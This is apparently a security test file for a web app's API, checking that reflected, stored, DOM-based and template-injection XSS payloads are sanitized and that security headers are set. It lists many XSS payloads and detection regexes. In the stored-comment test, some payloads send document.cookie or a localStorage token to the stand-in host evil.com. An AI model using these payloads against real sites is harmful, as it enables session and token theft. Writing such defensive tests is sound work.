/**
 * XSS (Cross-Site Scripting) Prevention Test Suite
 *
 * Comprehensive tests to validate XSS prevention across all MediaNest endpoints
 * Tests reflected, stored, and DOM-based XSS attack vectors
 */

import { PrismaClient } from '@prisma/client';
import supertest from 'supertest';
import { describe, test, expect, beforeEach, afterEach, beforeAll, afterAll } from 'vitest';

import { createApp } from '../../src/app';
import { AuthTestHelper } from '../helpers/auth-test-helper';
import { DatabaseTestHelper } from '../helpers/database-test-helper';

describe('XSS Prevention Test Suite', () => {
  let app: any;
  let request: supertest.SuperTest<supertest.Test>;
  let prisma: PrismaClient;
  let authHelper: AuthTestHelper;
  let dbHelper: DatabaseTestHelper;
  let userToken: string;
  let adminToken: string;

  beforeAll(async () => {
    app = createApp();
    request = supertest(app);
    prisma = new PrismaClient();
    authHelper = new AuthTestHelper(prisma);
    dbHelper = new DatabaseTestHelper(prisma);

    // Create test users
    const user = await authHelper.createTestUser('xss-test-user', 'xss-user@test.com');
    const admin = await authHelper.createTestUser('xss-admin', 'xss-admin@test.com', 'admin');

    userToken = await authHelper.generateValidToken(user.id, 'user');
    adminToken = await authHelper.generateValidToken(admin.id, 'admin');
  });

  afterAll(async () => {
    await dbHelper.cleanup();
    await prisma.$disconnect();
  });

  // Common XSS payloads for testing
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<svg onload="alert(\'XSS\')" />',
    '"onclick="alert(\'XSS\')"',
    "'onclick='alert(\"XSS\")'",
    '<iframe src="javascript:alert(\'XSS\')" />',
    '<object data="javascript:alert(\'XSS\')" />',
    '<embed src="javascript:alert(\'XSS\')" />',
    '<form><button formaction="javascript:alert(\'XSS\')" />',
    '<details open ontoggle="alert(\'XSS\')" />',
    '<marquee onstart="alert(\'XSS\')" />',
    '<video><source onerror="alert(\'XSS\')" />',
    '<audio src="x" onerror="alert(\'XSS\')" />',
    '<input onfocus="alert(\'XSS\')" autofocus />',
    '<select onfocus="alert(\'XSS\')" autofocus />',
    '<textarea onfocus="alert(\'XSS\')" autofocus />',
    '<keygen onfocus="alert(\'XSS\')" autofocus />',
    '<body onload="alert(\'XSS\')" />',
    '<div onmouseover="alert(\'XSS\')" />',
    '<span onclick="alert(\'XSS\')" />',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "vbscript:msgbox('XSS')",
    '<style>@import\'javascript:alert(\"XSS\")\'</style>',
    '<link rel="stylesheet" href="javascript:alert(\'XSS\')" />',
    '<base href="javascript:alert(\'XSS\')//" />',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')" />',
    "<!--<img src=\"--><img src=x onerror=alert('XSS')>",
    '<<SCRIPT>alert("XSS")<</SCRIPT>',
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    '"><svg/onload=alert(/XSS/)>',
    "onmouseover=alert('XSS')",
  ];

  const htmlEntities = [
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
  ];

  describe('Reflected XSS Prevention Tests', () => {
    test('should prevent XSS in media search queries', async () => {
      for (const payload of xssPayloads) {
        const response = await request
          .get('/api/v1/media/search')
          .query({ query: payload })
          .set('Authorization', `Bearer ${userToken}`);

        const responseText = JSON.stringify(response.body);

        // Should not contain unescaped script tags or event handlers
        expect(responseText).not.toMatch(/<script[^>]*>/i);
        expect(responseText).not.toMatch(/javascript:/i);
        expect(responseText).not.toMatch(/on\w+\s*=/i); // Event handlers like onclick, onload
        expect(responseText).not.toMatch(/<iframe[^>]*src=["']javascript:/i);
        expect(responseText).not.toMatch(/<img[^>]*onerror=/i);
        expect(responseText).not.toMatch(/<svg[^>]*onload=/i);

        // Should properly escape or remove dangerous content
        if (responseText.includes('script')) {
          expect(responseText).toMatch(/&lt;script|&amp;lt;script/);
        }
      }
    });

    test('should prevent XSS in user profile updates', async () => {
      for (const payload of xssPayloads.slice(0, 10)) {
        // Test subset for performance
        const response = await request
          .patch('/api/v1/users/profile')
          .send({ displayName: payload })
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toMatch(/<script[^>]*>/i);
          expect(responseText).not.toMatch(/javascript:/i);
          expect(responseText).not.toMatch(/on\w+\s*=/i);

          // Verify data is properly sanitized
          if (response.body.data?.displayName) {
            expect(response.body.data.displayName).not.toContain('<script>');
            expect(response.body.data.displayName).not.toContain('javascript:');
          }
        }
      }
    });

    test('should prevent XSS in error messages', async () => {
      const maliciousUsernames = [
        '<script>alert("XSS")</script>',
        '"onmouseover="alert(\'XSS\')"',
        "\"><img src=x onerror=alert('XSS')>",
      ];

      for (const username of maliciousUsernames) {
        const response = await request.post('/api/v1/auth/plex/verify').send({
          pin: '1234',
          username: username,
        });

        const responseText = JSON.stringify(response.body);

        // Error messages should not reflect unescaped user input
        expect(responseText).not.toMatch(/<script[^>]*>/i);
        expect(responseText).not.toMatch(/javascript:/i);
        expect(responseText).not.toMatch(/on\w+\s*=/i);
        expect(responseText).not.toMatch(/<img[^>]*onerror=/i);
      }
    });

    test('should prevent XSS in URL parameters', async () => {
      const xssUrls = [
        '/api/v1/media/movie/<script>alert("XSS")</script>',
        '/api/v1/users/<img src=x onerror=alert("XSS")>',
        '/api/v1/admin/stats?type=<svg onload=alert("XSS")>',
      ];

      for (const url of xssUrls) {
        const response = await request.get(url).set('Authorization', `Bearer ${adminToken}`);

        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toMatch(/<script[^>]*>/i);
        expect(responseText).not.toMatch(/javascript:/i);
        expect(responseText).not.toMatch(/on\w+\s*=/i);
      }
    });
  });

  describe('Stored XSS Prevention Tests', () => {
    test('should prevent stored XSS in media request titles', async () => {
      for (const payload of xssPayloads.slice(0, 15)) {
        // Test subset
        const createResponse = await request
          .post('/api/v1/media/request')
          .send({
            title: payload,
            type: 'movie',
            tmdbId: 12345,
          })
          .set('Authorization', `Bearer ${userToken}`);

        if (createResponse.status === 201) {
          const requestId = createResponse.body.data.id;

          // Verify stored data is sanitized when retrieved
          const getResponse = await request
            .get(`/api/v1/media/requests/${requestId}`)
            .set('Authorization', `Bearer ${userToken}`);

          if (getResponse.status === 200) {
            const title = getResponse.body.data.title;
            expect(title).not.toContain('<script>');
            expect(title).not.toMatch(/javascript:/i);
            expect(title).not.toMatch(/on\w+\s*=/i);
            expect(title).not.toContain('<img');
            expect(title).not.toContain('<svg');

            // Verify in list view as well
            const listResponse = await request
              .get('/api/v1/media/requests')
              .set('Authorization', `Bearer ${userToken}`);

            if (listResponse.status === 200) {
              const requestInList = listResponse.body.data.find((r: any) => r.id === requestId);
              if (requestInList) {
                expect(requestInList.title).not.toContain('<script>');
                expect(requestInList.title).not.toMatch(/javascript:/i);
              }
            }
          }
        }
      }
    });

    test('should prevent stored XSS in media request descriptions', async () => {
      const descriptionPayloads = [
        '<script>alert("Stored XSS")</script>',
        '<img src="x" onerror="alert(\'Stored XSS\')" />',
        '<div onmouseover="alert(\'Stored XSS\')" style="width:100%;height:100%">Hover me</div>',
        '"onclick="alert(\'Stored XSS\')" class="',
        "</textarea><script>alert('Stored XSS')</script><textarea>",
      ];

      for (const payload of descriptionPayloads) {
        const createResponse = await request
          .post('/api/v1/media/request')
          .send({
            title: 'XSS Test Movie',
            description: payload,
            type: 'movie',
            tmdbId: 54321,
          })
          .set('Authorization', `Bearer ${userToken}`);

        if (createResponse.status === 201) {
          const requestId = createResponse.body.data.id;

          const getResponse = await request
            .get(`/api/v1/media/requests/${requestId}`)
            .set('Authorization', `Bearer ${userToken}`);

          if (getResponse.status === 200) {
            const description = getResponse.body.data.description;
            expect(description).not.toContain('<script>');
            expect(description).not.toMatch(/javascript:/i);
            expect(description).not.toMatch(/on\w+\s*=/i);
            expect(description).not.toContain('<img');
            expect(description).not.toContain('</textarea>');
          }
        }
      }
    });

    test('should prevent stored XSS in user comments/notes', async () => {
      const commentPayloads = [
        '<script>fetch("/api/admin/users").then(r=>r.json()).then(console.log)</script>',
        '<img src="x" onerror="fetch(\'http://evil.com?data=\'+document.cookie)" />',
        "<iframe src=\"javascript:void(fetch('http://evil.com', {method:'POST', body:localStorage.getItem('token')}))\" />",
      ];

      for (const payload of commentPayloads) {
        const response = await request
          .post('/api/v1/media/request')
          .send({
            title: 'Test Movie',
            type: 'movie',
            tmdbId: 99999,
            comments: payload,
          })
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 201) {
          const comments = response.body.data.comments;
          if (comments) {
            expect(comments).not.toContain('<script>');
            expect(comments).not.toMatch(/javascript:/i);
            expect(comments).not.toMatch(/on\w+\s*=/i);
            expect(comments).not.toContain('<iframe');
            expect(comments).not.toContain('fetch(');
          }
        }
      }
    });
  });

  describe('DOM-based XSS Prevention Tests', () => {
    test('should prevent XSS via JSON responses that could be inserted into DOM', async () => {
      const domXssPayloads = [
        "\"});alert('XSS');//",
        "\"};setTimeout(alert.bind(null,'XSS'),0);//",
        "\"}]});alert('XSS');//",
        "\"});(function(){alert('XSS')})();//",
      ];

      for (const payload of domXssPayloads) {
        const response = await request
          .get('/api/v1/media/search')
          .query({ query: payload })
          .set('Authorization', `Bearer ${userToken}`);

        const responseText = response.text;

        // Check that the response doesn't contain executable JavaScript
        expect(responseText).not.toMatch(/\"\}\);\s*alert/i);
        expect(responseText).not.toMatch(/setTimeout\s*\(/i);
        expect(responseText).not.toMatch(/\"\}\]\}\);\s*alert/i);
        expect(responseText).not.toMatch(/function\s*\(\s*\)\s*\{.*alert/i);
      }
    });

    test('should properly escape JSON values that could break out of context', async () => {
      const contextBreakingPayloads = [
        "\"</script><script>alert('XSS')</script>",
        "\"</title><script>alert('XSS')</script>",
        "\"</textarea><script>alert('XSS')</script>",
        '"/><script>alert(\'XSS\')</script><input"',
        "'</style><script>alert('XSS')</script><style>'",
      ];

      for (const payload of contextBreakingPayloads) {
        const response = await request
          .post('/api/v1/media/request')
          .send({
            title: payload,
            type: 'movie',
            tmdbId: 11111,
          })
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 201) {
          const responseText = JSON.stringify(response.body);

          // Verify proper JSON escaping
          expect(responseText).not.toContain('</script>');
          expect(responseText).not.toContain('</title>');
          expect(responseText).not.toContain('</textarea>');
          expect(responseText).not.toContain('</style>');

          // Should be properly escaped as \"<\/script>
          if (responseText.includes('script')) {
            expect(responseText).toMatch(/\\"<\\/i);
          }
        }
      }
    });
  });

  describe('Content Security Policy (CSP) Tests', () => {
    test('should include CSP headers to prevent XSS', async () => {
      const response = await request
        .get('/api/v1/health')
        .set('Authorization', `Bearer ${userToken}`);

      // Check for security headers that help prevent XSS
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers['x-content-type-options']).toBe('nosniff');

      expect(response.headers).toHaveProperty('x-frame-options');
      expect(['DENY', 'SAMEORIGIN']).toContain(response.headers['x-frame-options']);

      expect(response.headers).toHaveProperty('x-xss-protection');
      expect(response.headers['x-xss-protection']).toMatch(/1; mode=block/);
    });

    test('should set proper Content-Type headers', async () => {
      const endpoints = [
        '/api/v1/health',
        '/api/v1/dashboard/stats',
        '/api/v1/media/search?query=test',
      ];

      for (const endpoint of endpoints) {
        const response = await request.get(endpoint).set('Authorization', `Bearer ${userToken}`);

        if (response.status === 200) {
          expect(response.headers).toHaveProperty('content-type');
          expect(response.headers['content-type']).toMatch(/application\/json/);

          // Ensure charset is specified to prevent encoding attacks
          expect(response.headers['content-type']).toMatch(/charset=utf-8/i);
        }
      }
    });
  });

  describe('Input Sanitization Tests', () => {
    test('should properly sanitize HTML entities', async () => {
      for (const payload of htmlEntities) {
        const response = await request
          .post('/api/v1/media/request')
          .send({
            title: payload,
            type: 'movie',
            tmdbId: 22222,
          })
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 201) {
          const title = response.body.data.title;

          // Should remain encoded or be double-encoded for safety
          expect(title).not.toContain('<script>');
          if (title.includes('script')) {
            expect(title).toMatch(/&lt;|&amp;lt;/);
          }
        }
      }
    });

    test('should handle Unicode and multibyte XSS attempts', async () => {
      const unicodeXssPayloads = [
        '\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e',
        '\x3cscript\x3ealert(\x27XSS\x27)\x3c/script\x3e',
        "\u0000javascript:alert('XSS')",
        "\uFF1Cscript\uFF1Ealert('XSS')\uFF1C/script\uFF1E",
      ];

      for (const payload of unicodeXssPayloads) {
        const response = await request
          .get('/api/v1/media/search')
          .query({ query: payload })
          .set('Authorization', `Bearer ${userToken}`);

        const responseText = JSON.stringify(response.body);

        // Should not contain unescaped Unicode script tags
        expect(responseText).not.toMatch(/\u003cscript|\x3cscript|<script/i);
        expect(responseText).not.toMatch(/javascript:/i);
      }
    });
  });

  describe('File Upload XSS Prevention Tests', () => {
    test('should prevent XSS in file upload responses', async () => {
      const maliciousFilenames = [
        '<script>alert("XSS")</script>.jpg',
        'test"><script>alert("XSS")</script>.png',
        'file.svg', // SVG files can contain scripts
        'test.html', // HTML files
        'script.js', // JavaScript files
      ];

      for (const filename of maliciousFilenames) {
        const response = await request
          .post('/api/v1/upload')
          .attach('file', Buffer.from('test content'), filename)
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toMatch(/<script[^>]*>/i);
          expect(responseText).not.toMatch(/javascript:/i);

          // Filename should be sanitized
          if (response.body.filename) {
            expect(response.body.filename).not.toContain('<script>');
            expect(response.body.filename).not.toContain('">');
          }
        } else {
          // Should reject dangerous file types
          expect([400, 415, 422]).toContain(response.status);
        }
      }
    });
  });

  describe('Template Injection Prevention Tests', () => {
    test('should prevent template injection attacks', async () => {
      const templateInjectionPayloads = [
        "{{constructor.constructor('alert(\\'XSS\\')')}})}}",
        "${alert('XSS')}",
        "#{alert('XSS')}",
        "<%= alert('XSS') %>",
        "{%alert('XSS')%}",
      ];

      for (const payload of templateInjectionPayloads) {
        const response = await request
          .post('/api/v1/media/request')
          .send({
            title: payload,
            type: 'movie',
            tmdbId: 33333,
          })
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 201) {
          const title = response.body.data.title;

          // Template syntax should be escaped or removed
          expect(title).not.toContain('{{');
          expect(title).not.toContain('${');
          expect(title).not.toContain('<%=');
          expect(title).not.toContain('{%');
          expect(title).not.toContain('constructor');
        }
      }
    });
  });

  describe('Response Header Security Tests', () => {
    test('should prevent XSS via response headers', async () => {
      const response = await request
        .get('/api/v1/dashboard/stats')
        .set('Authorization', `Bearer ${adminToken}`);

      // Verify security headers are present
      const securityHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': ['DENY', 'SAMEORIGIN'],
        'x-xss-protection': /1; mode=block/,
        'referrer-policy': /strict-origin|no-referrer/,
      };

      Object.entries(securityHeaders).forEach(([header, expectedValue]) => {
        expect(response.headers).toHaveProperty(header);

        if (Array.isArray(expectedValue)) {
          expect(expectedValue).toContain(response.headers[header]);
        } else if (expectedValue instanceof RegExp) {
          expect(response.headers[header]).toMatch(expectedValue);
        } else {
          expect(response.headers[header]).toBe(expectedValue);
        }
      });
    });
  });

  describe('XSS Filter Bypass Attempts', () => {
    test('should prevent common XSS filter bypass techniques', async () => {
      const bypassAttempts = [
        // Case variation
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<SCRIPT>alert("XSS")</SCRIPT>',
        // Attribute breaking
        '"autofocus onfocus="alert(\'XSS\')"',
        "'onmouseover='alert('XSS')'",
        // Nested tags
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        // Whitespace variations
        "<script\t>alert('XSS')</script>",
        "<script\n>alert('XSS')</script>",
        "<script\r>alert('XSS')</script>",
        // Comment breaking
        "<!--<img src=\"--><img src=x onerror=alert('XSS')>",
        // Protocol handlers
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=', // base64 encoded <script>alert('XSS')</script>
        // CSS expression
        "expression(alert('XSS'))",
      ];

      for (const payload of bypassAttempts) {
        const response = await request
          .get('/api/v1/media/search')
          .query({ query: payload })
          .set('Authorization', `Bearer ${userToken}`);

        const responseText = JSON.stringify(response.body);

        // Should not contain any executable script content
        expect(responseText).not.toMatch(/<script[^>]*>/i);
        expect(responseText).not.toMatch(/on\w+\s*=/i);
        expect(responseText).not.toMatch(/javascript:/i);
        expect(responseText).not.toMatch(/data:text\/html/i);
        expect(responseText).not.toMatch(/expression\s*\(/i);
      }
    });
  });
});
